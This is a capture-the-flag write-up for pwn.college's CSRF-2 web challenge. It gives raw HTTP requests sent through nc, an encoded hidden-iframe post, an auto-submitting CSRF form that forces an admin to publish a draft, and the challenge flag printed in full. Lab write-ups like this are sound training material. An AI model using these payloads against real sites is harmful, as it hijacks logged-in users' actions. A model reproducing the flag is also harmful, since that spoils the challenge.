---
layout: page
title: "CSRF-2 Write-up — pwn.college"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🔍 Challenge Description

A web application simulates a blogging platform (`pwnpost`) where users can:

- Log in
- Draft and publish posts
- View others’ published content

Admin has a secret flag post in the database. Although the admin doesn't view user messages (avoiding XSS), they *do* visit attacker-controlled pages via an automated `/challenge/victim` visit.

Our goal is to **leverage CSRF to force the admin to publish their draft post**, which contains the flag.

---

## 🖥️ Server Code Analysis

Key endpoints:

- `/login`: Logs in a user using form-based POST credentials
- `/draft`: Allows logged-in users to submit posts
- `/publish`: Publishes **all posts by the logged-in user**
- `/`: Shows UI depending on session status

Key points:

- Admin is logged in during `/challenge/victim`
- `/publish` is a **POST-only endpoint**
- There’s **no CSRF protection**

---

## ✅ Exploit Steps

### 1. Log in as `hacker` to craft payload

```bash
printf "POST /login HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:29\r\n\r\nusername=hacker&password=1337" | nc challenge.localhost 80
```
Retrieve the session cookie:
```
session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4tIg.UeFfsKiEUJQZu6_SbF0Hb4vk7Ww
```

### 2. Submit a malicious iframe post
Encoded payload:
```bash
PAYLOAD="content=%3Ciframe%20src%3D%22http%3A//hacker.localhost%3A1337/%22%20width%3D%220%22%20height%3D%220%22%3E%3C/iframe%3E&publish=on"
LENGTH=$(echo -n "$PAYLOAD" | wc -c)
```
### Send POST to /draft:
```bash
echo -e "POST /draft HTTP/1.0\r
Host: challenge.localhost\r
Cookie: session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4tIg.UeFfsKiEUJQZu6_SbF0Hb4vk7Ww\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: $LENGTH\r
\r
$PAYLOAD" | nc challenge.localhost 80
```
This results in a published iframe pointing to your server.

### 3. Create CSRF exploit server
Create index.html:
```bash
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://challenge.localhost/publish" method="POST">
      <!-- Auto-submits -->
    </form>
  </body>
</html>
```
Start your malicious server:
```
python3 -m http.server 1337
```

### 4. Trigger the victim visit
```
/challenge/victim
```

### Admin flow:
- Logs in as admin
- Visits the attacker's iframe
- Submits the CSRF POST /publish
- Publishes their draft post with the flag

---

## Retrieve the Flag
Log back in as hacker and visit /:
```bash
curl -b "session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4tfg.rRFVHW69ulYXVAW3mxmrGqfUh9o" http://challenge.localhost/
```
Check for the admin's published post:
```bash
<h2>Author: admin</h2>
pwn.college{sF0dTAIN8Gb6lmmbHg5UEdKy78_.QX4kzMzwSM0IzMyEzW}
```

### Final Flag
```
pwn.college{sF0dTAIN8Gb6lmmbHg5UEdKy78_.QX4kzMzwSM0IzMyEzW}
```

---

